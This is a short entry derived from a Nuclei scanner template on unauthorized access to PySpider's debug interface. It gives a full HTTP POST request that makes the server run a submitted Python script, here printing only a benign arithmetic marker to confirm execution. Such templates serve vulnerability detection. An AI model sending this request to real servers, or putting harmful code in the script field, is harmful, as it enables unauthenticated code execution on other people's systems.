# Vulnerability: Pyspider Unauthorized Access
**Classification:** PYSPIDER
**Source:** Nuclei Template (`pyspider-unauthorized-access.yaml`)

## Description
Unauthorized Access exists in PySpider which is an open-source web crawling and web scraping framework written in Python.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /debug/pyspidervulntest/run HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

webdav_mode=false&script=from+pyspider.libs.base_handler+import+*%0Aclass+Handler(BaseHandler)%3A%0A++++def+on_start(self)%3A%0A++++++++print(str(452345672+%2B+567890765))&task=%7B%0A++%22process%22%3A+%7B%0A++++%22callback%22%3A+%22on_start%22%0A++%7D%2C%0A++%22project%22%3A+%22pyspidervulntest%22%2C%0A++%22taskid%22%3A+%22data%3A%2Con_start%22%2C%0A++%22url%22%3A+%22data%3A%2Con_start%22%0A%7D
```

